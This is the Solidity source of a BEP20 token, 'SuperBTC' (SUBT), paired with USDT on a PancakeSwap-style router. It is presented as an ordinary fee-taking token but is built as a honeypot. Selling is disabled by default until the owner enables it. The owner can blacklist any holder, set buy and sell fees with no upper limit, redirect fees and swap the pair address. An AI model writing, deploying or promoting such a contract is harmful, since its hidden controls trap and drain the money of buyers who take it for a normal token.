contract SUBT is ERC20 {
    address public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public startTime;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _blackList;
    uint256 buyFee = 400;
    uint256 sellFee = 400;
    address marketAddr = 0x000000000000000000000000000000000000dEaD;
    bool canSell;

    constructor() ERC20("SuperBTC", "SUBT") {
        uniswapV2Router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        uniswapV2Pair = IUniswapV2Factory(
            IUniswapV2Router02(uniswapV2Router).factory()
        ).createPair(
                address(this),
                address(0x55d398326f99059fF775485246999027B3197955)
            );

        _approve(address(this), uniswapV2Router, ~uint256(0));
        IBEP20(address(0x55d398326f99059fF775485246999027B3197955)).approve(
            uniswapV2Router,
            ~uint256(0)
        );
        excludeFromFees(msg.sender, true);
        excludeFromFees(address(this), true);
        uint256 total = 500 * 10**decimals();
        _mint(msg.sender, total);
    }

    receive() external payable {}

    function setStartTime(uint256 _startTime) public onlyOwner {
        startTime = _startTime;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function setUniswapV2Pair(address _uniswapV2Pair) public onlyOwner {
        uniswapV2Pair = _uniswapV2Pair;
    }

    function isContract(address account) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(!_blackList[sender], "FUCK U");

        if (sender == address(this) || recipient == address(this)) {
            super._transfer(sender, recipient, amount);
            return;
        }

        uint256 balance = balanceOf(sender);
        require(balance >= amount, "balanceNotEnough");

        if (!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]) {
            uint256 maxSellAmount = (balance * 9999) / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool isAddLdx;
        bool isDelLdx;
        if (recipient == uniswapV2Pair) {
            isAddLdx = _isAddLiquidityV1();
        } else if (sender == uniswapV2Pair) {
            isDelLdx = _isDelLiquidityV1();
        }

        bool takeFee = true;

        if (
            _isExcludedFromFees[sender] ||
            _isExcludedFromFees[recipient] ||
            isAddLdx
        ) {
            takeFee = false;
        } else {
            if (sender == uniswapV2Pair) {
                require(startTime < block.timestamp);
            } else if (recipient == uniswapV2Pair && !isDelLdx) {
                require(canSell, "Not Open");
            } else if (sender != uniswapV2Pair && recipient != uniswapV2Pair) {
                takeFee = false;
            }
        }

        uint256 totalFee = 0;
        if (takeFee) {
            uint256 divBase = 10000;
            uint256 fee = 0;

            if (sender == uniswapV2Pair) {
                fee = (amount / divBase) * buyFee;
            } else {
                fee = (amount / divBase) * sellFee;
            }
            totalFee += fee;
            super._transfer(sender, marketAddr, fee);
        }

        super._transfer(sender, recipient, amount - totalFee);
    }

    function rescueToken(address tokenAddress, uint256 tokens)
        public
        onlyOwner
        returns (bool success)
    {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function setMarketAddr(address addr) public onlyOwner {
        marketAddr = addr;
    }

    function setFee(uint256 _buyFee, uint256 _sellFee) public onlyOwner {
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function setSell(bool status) public onlyOwner {
        canSell = status;
    }

    function _isAddLiquidityV1() internal view returns (bool ldxAdd) {
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(address(uniswapV2Pair))
            .getReserves();
        uint256 bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint256 bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if (token0 == address(this)) {
            if (bal1 > r1) {
                uint256 change1 = bal1 - r1;
                ldxAdd = change1 > 1000;
            }
        } else {
            if (bal0 > r0) {
                uint256 change0 = bal0 - r0;
                ldxAdd = change0 > 1000;
            }
        }
    }

    function _isDelLiquidityV1() internal view returns (bool ldxDel) {
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(address(uniswapV2Pair))
            .getReserves();
        uint256 bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint256 bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if (token0 == address(this)) {
            if (bal1 < r1 && r1 > 0) {
                uint256 change1 = r1 - bal1;
                ldxDel = change1 > 0;
            }
        } else {
            if (bal0 < r0 && r0 > 0) {
                uint256 change0 = r0 - bal0;
                ldxDel = change0 > 0;
            }
        }
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }
}
